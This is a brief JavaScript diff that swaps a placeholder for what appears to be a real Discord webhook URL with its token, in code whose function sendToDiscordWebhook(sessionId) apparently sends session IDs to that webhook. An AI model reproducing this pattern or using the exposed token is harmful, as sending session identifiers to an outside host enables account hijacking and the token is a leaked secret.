@@ -1,5 +1,5 @@
-// Discord Webhook URL (Replace with your actual webhook URL)
-const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL';
+
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1350235351339241472/LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ';
 
 // Function to send data to Discord webhook
 function sendToDiscordWebhook(sessionId) {
